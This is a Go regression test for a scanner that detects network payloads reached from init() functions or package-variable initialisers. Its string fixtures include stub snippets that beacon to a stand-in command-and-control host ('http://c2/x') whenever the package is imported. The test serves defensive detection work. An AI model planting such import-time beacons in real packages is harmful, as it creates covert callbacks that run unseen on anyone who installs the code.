package installsurface

import "testing"

// Regression for the elastic-agent live-fire: VC-002i attributed the WHOLE file's
// capabilities to the mere presence of an init(), firing on a magefile whose
// init only registers build targets. The fix scopes the scan to import-reachable
// code — but must not become a blind spot: a payload reached from init (at any
// depth, or via higher-order dispatch, or in an unparseable file) must still fire.
func TestConstrainedInitReachability(t *testing.T) {
	// --- Must STAY SILENT (the false positives the fix targets) ---
	silent := map[string]struct{ file, src string }{
		"mage: init registers targets via external registrar": {"magefile.go",
			"//go:build mage\npackage main\nimport \"net/http\"\n" +
				"func init() { common.RegisterCheckDeps(Update) }\n" +
				"func Update() error { _, err := http.Get(\"https://snapshots.elastic.co\"); return err }\n"},
		"cap in an unreached function": {"x_linux.go",
			"package p\nimport \"net/http\"\n" +
				"func init() { harmless() }\n" +
				"func harmless() {}\n" +
				"func Beacon() { http.Get(\"http://c2/x\") }\n"},
	}
	for name, c := range silent {
		if _, ok := analyzeConstrainedInit(c.file, c.src); ok {
			t.Errorf("%s: must NOT fire (capability is not import-reachable)", name)
		}
	}

	// --- Must STILL FIRE (no blind spot) ---
	fires := map[string]struct{ file, src string }{
		"payload in a directly-called helper": {"x_linux.go",
			"package p\nimport \"net/http\"\n" +
				"func init() { setup() }\n" +
				"func setup() { http.Get(\"http://c2/x\") }\n"},
		"payload two hops from init": {"x_linux.go",
			"package p\nimport \"net/http\"\n" +
				"func init() { a() }\nfunc a() { b() }\n" +
				"func b() { http.Get(\"http://c2/x\") }\n"},
		"payload via higher-order local dispatch": {"x_linux.go",
			"package p\nimport \"net/http\"\n" +
				"func init() { run(payload) }\n" +
				"func run(f func()) { f() }\n" +
				"func payload() { http.Get(\"http://c2/x\") }\n"},
		"payload reached from a package-var initializer": {"loader_amd64.go",
			"package p\nimport \"net/http\"\n" +
				"var _ = boot()\n" +
				"func boot() { http.Get(\"http://c2/x\") }\n"},
		"unparseable file falls back to whole-file scan": {"x_linux.go",
			"package p\nimport \"net/http\"\nfunc init() { http.Get(\"http://c2/x\"  \n"}, // syntax error
	}
	for name, c := range fires {
		if _, ok := analyzeConstrainedInit(c.file, c.src); !ok {
			t.Errorf("%s: MUST fire — a reachable auto-run payload is not a blind spot", name)
		}
	}
}
